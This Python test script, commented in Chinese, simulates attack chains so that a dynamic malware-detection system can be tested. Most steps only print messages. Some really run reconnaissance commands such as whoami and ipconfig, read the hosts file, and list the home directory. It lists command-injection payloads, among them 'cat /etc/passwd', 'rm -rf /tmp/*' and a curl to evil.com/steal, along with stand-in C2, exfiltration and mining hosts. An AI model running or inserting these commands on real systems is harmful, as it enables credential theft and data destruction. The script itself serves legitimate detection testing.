#!/usr/bin/env python3
"""
组合攻击测试用例 - 模拟复合恶意行为
用于测试动态检测系统能否捕获多阶段攻击
"""

import os
import socket
import subprocess
import urllib.request
import json

print("[开始] 组合攻击测试")

# ========== 攻击链1: 数据窃取 ==========
print("\n[攻击链1] 数据窃取")

# 步骤1: 收集信息
print("  步骤1: 收集系统信息")
hostname = socket.gethostname()
print(f"    -> Hostname: {hostname}")

# 步骤2: 读取文件
print("  步骤2: 读取本地文件")
hosts_path = "C:\\Windows\\System32\\drivers\\etc\\hosts"
try:
    with open(hosts_path, 'r') as f:
        content = f.read()
    print(f"    -> Read {len(content)} bytes from hosts")
except Exception as e:
    print(f"    -> Error: {e}")

# 步骤3: 网络外传（模拟）
print("  步骤3: 数据外传")
print(f"    -> Simulated POST to: http://evil.server.com/collect")


# ========== 攻击链2: 侦察 ==========
print("\n[攻击链2] 系统侦察")

# 收集用户信息
print("  收集用户信息")
result = subprocess.run(["whoami"], capture_output=True, text=True)
print(f"    -> User: {result.stdout.strip()}")

# 收集网络信息
print("  收集网络配置")
result = subprocess.run(["ipconfig"], capture_output=True, text=True)
print(f"    -> Network config collected")

# 扫描用户目录
print("  扫描用户目录")
user_dir = os.path.expanduser("~")
items = os.listdir(user_dir)
print(f"    -> Found {len(items)} items")


# ========== 攻击链3: 命令注入模式 ==========
print("\n[攻击链3] 命令注入模式")

injection_payloads = [
    "normal && whoami",
    "input | cat /etc/passwd",
    "data; rm -rf /tmp/*",
    "' && curl http://evil.com/steal #",
]
for payload in injection_payloads:
    print(f"  -> 检测到注入模式: {payload[:40]}")


# ========== 攻击链4: 持久化 ==========
print("\n[攻击链4] 持久化")

startup_paths = [
    os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"),
    "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
]
for path in startup_paths:
    print(f"  -> 启动项路径: {path}")

print(f"  -> 模拟写入: malicious.bat")


# ========== 攻击链5: C2通信 ==========
print("\n[攻击链5] C2通信模拟")

c2_endpoints = [
    "http://c2.evil.com/beacon",
    "http://attacker.server.com/checkin",
    "http://malicious.cnc/ping",
]
for endpoint in c2_endpoints:
    print(f"  -> Heartbeat: {endpoint}")

print(f"  -> Fetch: http://c2.evil.com/commands")
print(f"  -> Exfiltrate: http://c2.evil.com/report")


# ========== 攻击链6: 勒索软件 ==========
print("\n[攻击链6] 勒索软件行为")

print("  步骤1: 扫描目标文件")
target_extensions = [".txt", ".doc", ".pdf", ".jpg", ".png"]
print(f"    -> Target extensions: {target_extensions}")

print("  步骤2: 加密文件")
print(f"    -> Encrypting files...")

print("  步骤3: 删除原文件")
print(f"    -> Deleting originals...")

print("  步骤4: 创建勒索信")
print(f"    -> Created: READ_ME_TO_RESTORE.txt")


# ========== 攻击链7: 加密挖矿 ==========
print("\n[攻击链7] 加密货币挖矿")

print("  -> 高CPU使用模式")
pool_addresses = [
    "stratum+tcp://mining.pool.com:3333",
    "stratum+tcp://crypto-miner.net:4444",
]
for pool in pool_addresses:
    print(f"  -> 连接矿池: {pool}")


print("\n[完成] 组合攻击测试")
